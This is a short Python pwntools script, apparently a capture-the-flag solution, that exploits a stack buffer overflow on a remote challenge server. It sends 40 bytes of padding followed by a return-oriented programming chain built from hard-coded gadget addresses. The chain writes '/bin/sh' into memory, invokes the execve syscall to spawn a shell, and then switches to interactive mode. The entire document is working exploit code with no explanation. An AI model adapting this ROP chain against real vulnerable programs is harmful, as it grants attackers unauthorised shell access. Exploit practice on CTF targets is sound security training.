#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10130)

context.arch = 'amd64'

mov_qrdi_rsi = 0x000000000047a502
pop_rdi = 0x0000000000401456
buf = 0x6c9a20
pop_rax_rdx_rbx = 0x0000000000478516
pop_rsi = 0x0000000000401577
syscall = 0x00000000004671b5

r.recvuntil(':')
r.send('a' * 40 + flat([pop_rdi, buf, pop_rsi, '/bin/sh\x00', mov_qrdi_rsi, pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rsi, 0, syscall]))
r.interactive()
